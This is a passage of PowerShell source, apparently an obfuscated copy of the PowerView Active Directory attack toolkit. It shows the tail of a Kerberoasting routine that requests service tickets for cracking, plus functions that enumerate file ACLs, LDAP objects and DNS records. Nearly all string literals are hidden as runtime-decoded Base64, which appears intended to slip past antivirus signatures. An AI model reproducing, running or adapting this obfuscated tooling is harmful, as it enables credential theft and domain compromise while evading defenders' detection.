        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'kr'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgB0AGcAdAA=')))} | Get-DomainSPNTicket -OutputFormat $OutputFormat
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Get-PathAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function Convert-FileRight {
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )
            $AccessMask = @{
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBSAGUAYQBkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBXAHIAaQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBFAHgAZQBjAHUAdABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAbABvAHcAZQBkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMQAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAUwB5AHMAdABlAG0AUwBlAGMAdQByAGkAdAB5AA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAxADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADgAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE8AdwBuAGUAcgA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADQAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAQQBDAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADIAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAG8AbgB0AHIAbwBsAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEEAdAB0AHIAaQBiAHUAdABlAHMA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAQwBoAGkAbABkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQAvAFQAcgBhAHYAZQByAHMAZQA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEUAeAB0AGUAbgBkAGUAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABFAHgAdABlAG4AZABlAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQARABhAHQAYQAvAEEAZABkAFMAdQBiAGQAaQByAGUAYwB0AG8AcgB5AA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAYQB0AGEALwBBAGQAZABGAGkAbABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABEAGEAdABhAC8ATABpAHMAdABEAGkAcgBlAGMAdABvAHIAeQA=')))
            }
            $SimplePermissions = @{
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAZgAwADEAZgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AGwAbABDAG8AbgB0AHIAbwBsAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMwAwADEAYgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAaQBmAHkA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAYQA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABFAHgAZQBjAHUAdABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADEAOQBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABXAHIAaQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAOAA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZAA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMQA2AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA==')))
            }
            $Permissions = @()
            $Permissions += $SimplePermissions.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }
            $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($Permissions | Where-Object {$_}) -join ','
        }
        $ConvertArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ConvertArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $MappedComputers = @{}
    }
    PROCESS {
        ForEach ($TargetPath in $Path) {
            try {
                if (($TargetPath -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                    $HostComputer = (New-Object System.Uri($TargetPath)).Host
                    if (-not $MappedComputers[$HostComputer]) {
                        Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                        $MappedComputers[$HostComputer] = $True
                    }
                }
                $ACL = Get-Acl -Path $TargetPath
                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = ConvertFrom-SID -ObjectSID $SID @ConvertArguments
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) $TargetPath
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBTAHkAcwB0AGUAbQBSAGkAZwBoAHQAcwA='))) (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) $Name
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFMASQBEAA=='))) $SID
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbABUAHkAcABlAA=='))) $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAGkAbABlAEEAQwBMAA=='))))
                    $Out
                }
            }
            catch {
                Write-Verbose "[Get-PathAcl] error: $_"
            }
        }
    }
    END {
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}
function Convert-LDAPProperty {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )
    $ObjectProperties = @{}
    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHMAcABhAHQAaAA=')))) {
            if (($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGQAaABpAHMAdABvAHIAeQA='))))) {
                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAHQAeQBwAGUA')))) {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA==')))) {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA=')))) {
                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA')))) {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByAA==')))) {
                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA==')))] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYwByAGUAdABpAG8AbgBhAHIAeQBBAGMAbAA=')))] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0AQQBjAGwA')))] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA==')))) {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFYARQBSAA==')))
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAUABhAHMAcwB3AG8AcgBkAFQAaQBtAGUA')))) ) {
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $Properties[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f $High, $Low)))
                }
                else {
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f $High, $Low)
                }
                catch {
                    Write-Verbose "[Convert-LDAPProperty] error: $_"
                    $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ObjectProperties
    }
    catch {
        Write-Warning "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}
function Get-DomainSearcher {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            $TargetDomain = $Domain
            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $UserDomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $DomainObject = Get-Domain -Credential $Credential
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $TargetDomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            write-verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBlAHQALQBkAG8AbQBhAGkAbgA=')))
            $DomainObject = Get-Domain
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            $BindServer = $Server
        }
        $SearchString = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwA=')))
        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQBQAHIAZQBmAGkAeAA=')))]) {
            $SearchString += $SearchBasePrefix + ','
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) {
            if ($SearchBase -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBHAEMAOgAvAC8A')))) {
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBMAEQAQQBQADoALwAvAA==')))) {
                    if ($SearchBase -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAuACsALwAuACsA')))) {
                        $SearchString = ''
                        $DN = $SearchBase
                    }
                    else {
                        $DN = $SearchBase.SubString(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA=')))))"
            }
        }
        $SearchString += $DN
        Write-Verbose "[Get-DomainSearcher] search base: $SearchString"
        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAZQBhAHIAYwBoAGUAcgBdACAAVQBzAGkAbgBnACAAYQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABmAG8AcgAgAEwARABBAFAAIABjAG8AbgBuAGUAYwB0AGkAbwBuAA==')))
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }
        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) {
            $Searcher.Tombstone = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
            $Searcher.filter = $LDAPFilter
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA='))) { [System.DirectoryServices.SecurityMasks]::Dacl }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))) { [System.DirectoryServices.SecurityMasks]::Group }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA='))) { [System.DirectoryServices.SecurityMasks]::None }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA=='))) { [System.DirectoryServices.SecurityMasks]::Owner }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA='))) { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }
        $Searcher
    }
}
function Convert-DNSRecord {
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )
    BEGIN {
        function Get-Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )
            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''
            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }
    PROCESS {
        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)
        $TTLRaw = $DNSRecord[12..15]
        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)
        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        if ($Age -ne 0) {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $TimeStamp = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBzAHQAYQB0AGkAYwBdAA==')))
        }
        $DNSRecordObject = New-Object PSObject
        if ($RDataType -eq 1) {
            $IP = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwAH0ALgB7ADEAfQAuAHsAMgB9AC4AewAzAH0A'))) -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            $Data = $IP
            $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'A'
        }
        elseif ($RDataType -eq 2) {
            $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $NSName
            $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'NS'
        }
        elseif ($RDataType -eq 5) {
            $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Alias
            $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAEEATQBFAA==')))
        }
        elseif ($RDataType -eq 6) {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEEA')))
        }
        elseif ($RDataType -eq 12) {
            $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Ptr
            $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABUAFIA')))
        }
        elseif ($RDataType -eq 13) {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABJAE4ARgBPAA==')))
        }
        elseif ($RDataType -eq 15) {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'MX'
        }
        elseif ($RDataType -eq 16) {
            [string]$TXT  = ''
            [int]$SegmentLength = $DNSRecord[24]
            $Index = 25
            while ($SegmentLength-- -gt 0) {
                $TXT += [char]$DNSRecord[$index++]
            }
            $Data = $TXT
            $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABYAFQA')))
        }
        elseif ($RDataType -eq 28) {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBBAEEAQQA=')))
        }
        elseif ($RDataType -eq 33) {
